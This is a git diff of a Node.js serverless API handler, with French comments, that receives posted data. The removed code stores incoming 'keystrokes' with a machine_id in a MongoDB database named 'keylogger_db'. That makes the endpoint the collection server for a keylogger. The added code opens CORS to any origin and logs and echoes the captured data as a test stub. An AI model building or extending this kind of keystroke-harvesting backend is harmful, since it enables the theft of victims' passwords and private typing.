@@ -3,28 +3,38 @@ import { MongoClient } from 'mongodb';
 const uri = process.env.MONGODB_URI;
 
 export default async function handler(req, res) {
+    // Autoriser CORS
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+    // Gérer les requêtes OPTIONS (pre-flight)
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
+    }
+
+    // Vérifier la méthode
     if (req.method !== 'POST') {
-        return res.status(405).json({ message: 'Méthode non autorisée' });
+        return res.status(405).json({ 
+            error: 'Méthode non autorisée',
+            method: req.method,
+            allowedMethod: 'POST'
+        });
     }
 
     try {
-        const client = await MongoClient.connect(uri);
-        const db = client.db('keylogger_db');
-        const collection = db.collection('keystrokes');
+        // Log pour debug
+        console.log('Données reçues:', req.body);
 
-        const { machine_id, timestamp, keystrokes } = req.body;
-
-        await collection.insertOne({
-            machine_id,
-            timestamp,
-            keystrokes,
-            created_at: new Date()
+        // Pour le test, on renvoie juste un succès
+        return res.status(200).json({ 
+            success: true, 
+            message: 'Données reçues avec succès',
+            data: req.body 
         });
 
-        await client.close();
-
-        res.status(200).json({ message: 'Données enregistrées avec succès' });
     } catch (error) {
-        res.status(500).json({ message: 'Erreur serveur', error: error.message });
+        console.error('Erreur:', error);
+        return res.status(500).json({ error: error.message });
     }
 } 
